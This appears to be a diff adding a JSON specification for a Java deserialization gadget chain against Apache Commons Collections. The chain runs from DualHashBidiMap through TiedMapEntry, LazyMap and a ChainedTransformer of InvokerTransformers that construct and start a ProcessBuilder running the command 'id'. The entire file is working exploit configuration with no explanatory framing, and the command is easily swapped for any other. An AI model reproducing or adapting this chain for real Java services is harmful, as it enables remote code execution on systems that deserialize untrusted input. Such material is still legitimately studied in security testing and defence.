@@ -1,0 +1,61 @@
+{
+  "chain_type": "CC_ProcessBuilder - ProcessBuilder.start() via DualHashBidiMap",
+  "root_class": "org.apache.commons.collections.bidimap.DualHashBidiMap",
+  "root_trigger": "readObject->HashMap.put->hash->TiedMapEntry.hashCode->LazyMap.get",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "foo"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"},
+          {"$ref": "link:6"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {"iConstant": "java.lang.ProcessBuilder"}
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getConstructor",
+        "iParamTypes": ["[Ljava.lang.Class;"],
+        "iArgs": [["[Ljava.lang.String;"]]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "newInstance",
+        "iParamTypes": ["[Ljava.lang.Object;"],
+        "iArgs": [[["id"]]]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "start",
+        "iParamTypes": [],
+        "iArgs": []
+      }
+    }
+  ],
+  "sink_method": "ProcessBuilder.start"
+}
